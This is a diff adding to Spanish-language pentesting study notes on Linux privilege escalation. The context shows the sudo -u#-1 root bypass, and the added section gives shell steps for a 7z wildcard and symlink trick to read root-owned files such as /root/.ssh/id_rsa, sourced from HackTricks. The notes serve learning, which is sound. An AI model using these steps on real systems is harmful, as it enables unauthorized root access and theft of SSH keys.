@@ -161,3 +161,12 @@ root@nix02:/home/cry0l1t3# id
 uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
 ```
 - `sudo -u#-1` + binario permitido para ejecutar como root. = exploit
+
+## Wildcards spare tricks
+- Definición: Wildcards son caracteres especiales que permiten buscar y manipular archivos y directorios de manera más eficiente.
+- **Ataque con 7z**: Se pueden crear archivos donde 7z se va a ejecutar y hacer un symlink attack para obtener acceso a archivos que no deberíamos tener acceso.
+    - cd /path/to/7z/acting/folder
+    - touch @root.txt
+    - ln -s /file/you/want/to/read root.txt
+- Pensar que con esto se puede conseguir `/root/.ssh/id_rsa`
+- [Source](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
